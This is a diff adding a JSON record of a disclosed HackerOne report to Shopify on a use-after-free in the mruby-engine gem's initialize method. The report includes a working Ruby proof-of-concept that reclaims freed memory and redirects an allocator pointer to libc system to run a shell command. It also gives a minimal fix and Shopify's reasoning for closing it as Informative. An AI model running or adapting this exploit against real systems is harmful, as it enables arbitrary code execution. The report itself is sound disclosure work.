@@ -1,0 +1,152 @@
+{
+  "id": 3679660,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjc5NjYw",
+  "url": "https://hackerone.com/reports/3679660",
+  "title": "mruby-engine: UAF in MRubyEngine#initialize enables local RCE",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "none",
+  "readable_substate": "Informative",
+  "created_at": "2026-04-17T07:47:18.143Z",
+  "submitted_at": "2026-04-17T07:47:19.753Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "0xd0ff9",
+    "url": "/0xd0ff9",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/m643g2dt4igbyilf9reor5gz4ull/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1382,
+    "url": "https://hackerone.com/shopify",
+    "handle": "shopify",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Shopify",
+      "twitter_handle": "",
+      "website": "https://www.shopify.com",
+      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-04-24T21:09:02.664Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-04-18T02:14:04.596Z",
+  "team_member_agreed_on_going_public_at": "2026-04-24T21:09:01.991Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nDouble-init of `MRubyEngine` frees engine + unmaps mspace, but leaves Ruby\n`DATA_PTR` dangling. Kernel reuses freed VA via `mmap(MAP_FIXED)`. Attacker\nforges `me_mruby_engine` struct + `mrb_state` in reclaimed region, points\n`mrb_state->allocf` at `libc.system`, arranges bytes of `mrb_state` to also\nspell a shell command. Next engine method calls `mrb_malloc` → indirect call\nthrough `allocf` → `system(\"id>/tmp/pwned\")`.\n\n**Confirmed**: `/tmp/pwned` written with `uid=0(root) gid=0(root) groups=0(root)`\ninside test container.\n\n## Root cause\n\n[ext/mruby_engine/ext.c:128-173](ext/mruby_engine/ext.c#L128-L173)\n\n```c\nstatic VALUE ext_mruby_engine_initialize(int argc, VALUE *argv, VALUE rself) {\n  ext_mruby_engine_free(DATA_PTR(rself));   // frees engine + munmap mspace\n\n  long capacity = NUM2LONG(rcapacity);\n  if (capacity <= 0) {\n    rb_raise(rb_eArgError, \"memory quota cannot be negative\");  // raise AFTER free\n  }\n  ...\n  DATA_PTR(rself) = engine;   // only on success path\n}\n```\n\nTwo defects:\n\n1. `initialize` is re-callable via `obj.send(:initialize, ...)` — bypasses\n   Ruby's private-visibility convention. Every call first **frees the existing\n   engine** before validating args.\n2. `DATA_PTR(rself)` never zeroed after free. Any `rb_raise` between free and\n   successful re-init leaves `self` holding dangling pointer. GC finalizer\n   `ext_mruby_engine_free` will also run on it later → double free, but before\n   that the dangling pointer is reachable by every instance method.\n\nPre-success raise paths: negative capacity, negative instruction quota,\nnegative time quota, `me_memory_pool_new` failure, `me_mruby_engine_new`\nfailure.\n\n## Primitives\n\n| Primitive | Mechanism |\n|-----------|-----------|\n| P1. UAF on `DATA_PTR` | `send(:initialize, -1, 1, 1)` raises after free |\n| P2. Kernel VA reuse | freed mspace is `MAP_PRIVATE\\|MAP_ANONYMOUS`, kernel returns same VA to next `mmap(MAP_FIXED, hole_addr)` |\n| P3. Full engine forgery | attacker writes `me_mruby_engine` at reclaimed VA |\n| P4. `mrb_allocf` hijack | `mrb_malloc` → `(mrb->allocf)(mrb, NULL, sz, mrb->allocf_ud)` = `system(mrb_ptr, ...)` where `mrb_ptr` is attacker buffer starting with shell command |\n\n## Struct layouts used\n\n`me_mruby_engine` — [ext/mruby_engine/mruby_engine_private.h:27](ext/mruby_engine/mruby_engine_private.h#L27)\n\n```\n+0   struct mrb_state *state\n+8   struct me_memory_pool *allocator\n...  (eval_state, quotas, flags)\n```\n\n`mrb_state` — [ext/mruby_engine/mruby/include/mruby.h:168](ext/mruby_engine/mruby/include/mruby.h#L168)\n\n```\n+0   struct mrb_jmpbuf *jmp       ← first 16 bytes reused as cmd string\n+8   uint32_t flags (+pad)\n+16  mrb_allocf allocf            ← set to libc system\n+24  void *allocf_ud\n```\n\nWhen `(mrb->allocf)(mrb, ptr, size, ud)` fires, `system(mrb, ...)` executes.\n`system` reads first arg as `const char*` → command = bytes at `mrb+0`.\n\n## Exploit (poc_rce_final.rb)\n\n```ruby\nrequire \"mruby_engine\"; require \"fiddle\"; require \"fiddle/import\"\n\nmodule LibC\n  extend Fiddle::Importer\n  dlload Fiddle.dlopen(nil)\n  extern \"void* mmap(void*, size_t, int, int, int, long)\"\nend\n\nCAP = 8 * 1024 * 1024\nPROT_RW = 3\nMAP_FIXED_ANON = 0x02 | 0x20 | 0x10   # PRIVATE|ANON|FIXED\n\nsystem_addr = Fiddle::Handle::DEFAULT[\"system\"]\n\n# 1. UAF: double-init raises on capacity <= 0\ndead = MRubyEngine.new(CAP, 1_000_000, 60)\ndead.sandbox_eval(\"w.rb\", \"1\")\nbegin; dead.send(:initialize, -1, 1, 1); rescue ArgumentError; end\n\n# 2. Find 8 MiB hole where freed mspace lived\nhole_start, _ = find_hole(CAP)            # scans /proc/self/maps\n\n# 3. Reclaim VA with attacker-controlled bytes\nLibC.mmap(Fiddle::Pointer.new(hole_start), CAP, PROT_RW, MAP_FIXED_ANON, -1, 0)\nFiddle::Pointer.new(hole_start, CAP)[0, CAP] = \"\\x00\".b * CAP\n\n# 4. Forge engine at DATA_PTR offset (0x3e0, observed via gdb)\ndata_ptr   = hole_start + 0x3e0\nfake_state = hole_start + 0x100\nFiddle::Pointer.new(data_ptr, 8)[0, 8] = [fake_state].pack(\"Q\")\n\n# 5. Forge mrb_state: jmp slot = cmd string, allocf = system\ncmd = \"id>/tmp/pwned\\x00\".b\nbuf = cmd + (\"\\x00\".b * (16 - cmd.bytesize)) +\n      [system_addr].pack(\"Q\") + [0].pack(\"Q\")\nFiddle::Pointer.new(fake_state, buf.bytesize)[0, buf.bytesize] = buf\n\n# 6. Trigger any engine method → mrb_malloc → system()\ndead.sandbox_eval(\"rce.rb\", \"noop\")\n```\n\nRun:\n```\n$ ruby poc_rce_final.rb\n$ cat /tmp/pwned\nuid=0(root) gid=0(root) groups=0(root)\n```\n{F5750521}\n## Test environment\n\nMitigations disabled to simplify PoC — bug is real on hardened builds too,\njust needs extra info leak / heap grooming.\n\n- `setarch -R` (ASLR off)\n- `CFLAGS=-O0 -g3 -fno-stack-protector -U_FORTIFY_SOURCE -fno-pie -no-pie -z execstack`\n- `LDFLAGS=-fno-pie -no-pie -z norelro -z lazy`\n\n## Reliability\n\n- VA reclaim: 60/60 (kernel greedily returns freed anon range to `MAP_FIXED`)\n- Cross-instance aliasing: 20/20 via inject/extract ivar round-trip\n- RCE end-to-end: stable after zero-init of reclaimed region (avoids\n  `quota_error_raised` byte triggering early raise)\n\n## Preconditions\n\n- Host-Ruby caller that can invoke `MRubyEngine#send(:initialize, ...)`. Not\n  reachable from guest mruby (guest cannot call Ruby-level `send` on host\n  objects). Host integration code that reuses or exposes engine objects, or\n  any `eval`/deserialization of untrusted host-side Ruby, is the attack\n  surface.\n- Kernel Linux ≥ 4.x with standard `MAP_FIXED` semantics (replaces existing\n  mapping).\n\n## Fix (minimal)\n\n[ext/mruby_engine/ext.c:128-139](ext/mruby_engine/ext.c#L128-L139) — zero\n`DATA_PTR` before any raise, and do validation before free:\n\n```c\nstatic VALUE ext_mruby_engine_initialize(int argc, VALUE *argv, VALUE rself) {\n  VALUE rcapacity, r_instruction_quota, r_time_quota_s;\n  rb_scan_args(argc, argv, \"3\", &rcapacity, &r_instruction_quota, &r_time_quota_s);\n\n  long capacity = NUM2LONG(rcapacity);\n  if (capacity <= 0) rb_raise(rb_eArgError, \"memory quota cannot be negative\");\n  long instruction_quota = NUM2LONG(r_instruction_quota);\n  if (instruction_quota <= 0) rb_raise(rb_eArgError, \"instruction quota cannot be negative\");\n  VALUE r_time_quota_ms = rb_funcall(r_time_quota_s, me_ext_id_mul, 1, LONG2FIX(1000));\n  long time_quota_ms = NUM2LONG(r_time_quota_ms);\n  if (time_quota_ms <= 0) rb_raise(rb_eArgError, \"time quota cannot be negative\");\n\n  /* Only now free old engine. */\n  void *old = DATA_PTR(rself);\n  DATA_PTR(rself) = NULL;       /* close UAF window */\n  ext_mruby_engine_free(old);\n\n  ... allocate new engine ...\n  DATA_PTR(rself) = engine;\n  return Qnil;\n}\n```\n\nStronger fix: raise `rb_eRuntimeError` on second `initialize` call\n(`DATA_PTR != NULL`) — matches Ruby convention that `initialize` runs once.\nPrevents any future pre-success raise path from reintroducing the UAF.\n\n## Affected files\n\n- [ext/mruby_engine/ext.c:128-173](ext/mruby_engine/ext.c#L128-L173) — bug site\n- [ext/mruby_engine/memory_pool.c:47](ext/mruby_engine/memory_pool.c#L47) — mmap enabling VA reuse\n- [ext/mruby_engine/mruby_engine_private.h:27](ext/mruby_engine/mruby_engine_private.h#L27) — forged struct layout\n- [ext/mruby_engine/mruby/include/mruby.h:168](ext/mruby_engine/mruby/include/mruby.h#L168) — `mrb_state` / `allocf`\n\n## Impact\n\nRCE",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5750521,
+      "file_name": "Screen_Recording_2026-04-17_at_2.38.20_PM.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4acl2dvp2md1u23s9q2e751xpog6?response-content-disposition=attachment%3B%20filename%3D%22Screen_Recording_2026-04-17_at_2.38.20_PM.mov%22%3B%20filename%2A%3DUTF-8%27%27Screen_Recording_2026-04-17_at_2.38.20_PM.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRZYHOQKE%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T162113Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIC1JnpIQM%2Byu9Nby75M03%2BKLR2p6AKIxCXrCul05cfKQAiA%2BSds5c8FTyCRF89L7EoFJEq2MUIYg2IYoKZAx9J3LlSqyBQg%2FEAMaDDAxMzYxOTI3NDg0OSIM5vBrxqeS%2BNTRbtLsKo8FIHHa5PRrW%2FOUaVXUAvJuwQqrs6pG81eo32P9Ri791tu10wHpyrHUe0CDx0AoxBIdEL9IV%2FPu6Kc3hPCggJF8LcxcwOYu6LaVlxDZcDsBRZ5QxvejB7X5hs30eYjfXkuICLt2hUbRNh8SSVYQtqsnmO3VTn%2BsAnfEUgSXGCb1UGndGaLB10Rw1z5nMMS%2BFG3ob%2Fho9U2otgnh9Sr8Um38AX4zs1WapXeLcGWPuTHvXLrlEE0auzX%2Bpc9Qat4XzXKQRtdoa5ck0F%2B%2B5X%2Fcf2DiJ65S0BqOEH%2Bv7%2BIL8JTO2OOCHB2M1TysOdAby5MoxvuVNuBJrAkVdbWwHMZykagLAlYrhGyhhX2rciA3obE5nkpqCdzY2fj9%2BgaaAtGGNrnNH7PP8wFenvMVpxcL6xychnocZz7xcY83dpZuuresK7Rio0hd56TZ04voDF%2FZW%2Bdw2ss41On%2BbXNGhHZLI6q5dci2F3up7o9Q9j55wOGzyCe2S9nPNcCyr8FrIZvkvHnEneOZV%2F06IktzkiXLRfUXuwl%2BeiTuAgxbOq4hElZGU1Ics2ZcaLw3ULWhon9bJ7t6uZPP05T3sYv2azhf3bcO3ckwSRr%2FzLkvpT%2FE2WUNSeMuB36EFzU%2B7fIehwUqs40o1lmPZV01BKNVwTMJN%2B%2FKWMyO5nUJAyZPe3kSGxoerMwK8Z4xOg9cnlZwh1V3dpIL2iEHNsV9FRyhabapWQYcg8QrXGJtMk53F6jVX7ZA2K7rO1CKQSGnUhqM77SimyvJ4emkZiOD0reOQbKkUPcRDdJFhWBjVL9cYMNhy89NtXuRdWC%2FMYY0ZGCGLLJ1bUJFCc8ayLh4IRb3pOtsKUYqCmHY7Geiqk82axiPrjNsWjC8jtjPBjqyAbRU2tRKyHb7yJvuc6mj8AWtIlvru%2BIGWg%2BUMlrPpPq0mgswZJtczKHvlUXFHTmtE1Fdhp5uryCq6i8rc%2BP%2FHEiG5CioA3kqlRd4t97Sxbjlhd9xiudJl6KQ2Cj%2BHxdeSm9r%2B2dVgBjW3ccg2Wz4FNB5P9Py1%2BcGP0yuEMs8xCLQ%2BYwcnrWd3OWKsT9UDHSN04BZ4CwNHwPSNkwaX5g1SFDhASQgEz%2FT%2BNE%2FoDxAsfXZh6k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ff8008d7897316994026fb3234ea63ac1a9f5681669e9a250094c64c6c4b4a3b",
+      "file_size": 59446517,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 28,
+  "voters": [
+    "zy9ard3",
+    "2026",
+    "neilx",
+    "52_hz",
+    "tr3b0l",
+    "rafiq_ym",
+    "claudeb",
+    "m7monster",
+    "jayanto_kumar_roy9",
+    "pepx",
+    "and 18 more..."
+  ],
+  "severity": {
+    "rating": "none",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 596023,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/Shopify/*",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 847126,
+      "category": "team",
+      "content": "This report identified a memory-safety bug in Shopify's open-source `mruby-engine` gem: `MRubyEngine#initialize` frees the underlying C engine before validating its arguments and never clears `DATA_PTR` on failure, leaving a dangling pointer that an attacker-controlled `mmap(MAP_FIXED)` can reclaim to hijack `mrb_state->allocf` into `libc.system`. \n\nWe closed this as Informative because the attack surface requires a host-Ruby caller that can invoke `MRubyEngine#send(:initialize, …)` — a precondition not reachable from within the mruby guest sandbox. For findings against `https://github.com/Shopify/*` scope, showing that it can be reproduced in a locally built container is the starting point, not the finish line: to be eligible, the report needs to show how an attacker reaches the vulnerable code path in Shopify's actual use of the library, or why any Ruby host embedding the gem would expose that surface.",
+      "updated_at": "2026-04-24T21:01:09.684Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 3412393,
+        "username": "seb_shopify",
+        "name": "Sebastien",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2024-10-02T14:40:12.193Z",
+        "url": "https://hackerone.com/seb_shopify",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
